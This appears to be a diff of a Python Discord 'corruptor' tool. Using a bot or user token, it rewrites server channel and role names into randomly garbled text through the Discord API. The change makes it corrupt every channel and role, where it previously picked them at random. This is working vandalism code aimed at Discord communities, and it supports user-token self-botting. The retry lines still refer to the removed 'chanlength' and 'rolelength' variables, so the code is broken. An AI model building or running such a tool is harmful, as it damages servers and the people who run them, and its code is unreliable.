@@ -283,23 +283,35 @@ def addemoji(server,encoded,name): # This has pretty huge rate limits, be carefu
         time.sleep(1)
         addemoji(server,encoded,name)
 
-def corrupt_channel(channelid,chanlength):
+def corrupt_channel(channelid,channame):
     if clienttype == 'bot':
         headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
     else:
         headers={ 'Authorization': token,'Content-Type': 'application/json'}
-    payload = {'name': asciigen(chanlength)}
+    corruptchanname = ''
+    for x in channame:
+        if random.randint(1,2) == 1:
+            corruptchanname += asciigen(1)
+        else:
+            corruptchanname += x
+    payload = {'name': corruptchanname}
     src = requests.patch('https://discordapp.com/api/v6/channels/{}'.format(channelid), headers=headers,json=payload)
     if "You are being rate limited." in str(src.content):
         time.sleep(1)
         corrupt_channel(channelid,chanlength)
 
-def corrupt_role(serverid,roleid,rolelength):
+def corrupt_role(serverid,roleid,rolename):
     if clienttype == 'bot':
         headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
     else:
         headers={ 'Authorization': token,'Content-Type': 'application/json'}
-    payload = {'name': asciigen(rolelength)}
+    corruptrolename = ''
+    for x in rolename:
+        if random.randint(1,2) == 1:
+            corruptrolename += asciigen(1)
+        else:
+            corruptrolename += x
+    payload = {'name': corruptrolename}
     src = requests.patch('https://ptb.discordapp.com/api/v6/guilds/{}/roles/{}'.format(serverid,roleid), headers=headers,json=payload)
     if "You are being rate limited." in str(src.content):
         time.sleep(1)
@@ -1054,15 +1066,9 @@ async def corruptor(server):
     SERVER = server.id
     print("Corrupting...")
     for channel in server.channels:
-        if random.randint(1,2) == 1:
-            pool.add_task(corrupt_channel,channel.id,len(channel.name))
-        else:
-            continue
+        pool.add_task(corrupt_channel,channel.id,channel.name)
     for role in server.roles:
-        if random.randint(1,2) == 1:
-            pool.add_task(corrupt_role,server.id,role.id,len(role.name))
-        else:
-            continue
+        pool.add_task(corrupt_role,server.id,role.id,role.name)
     servername = ''
     for x in server.name:
         if random.randint(1,2) == 1:
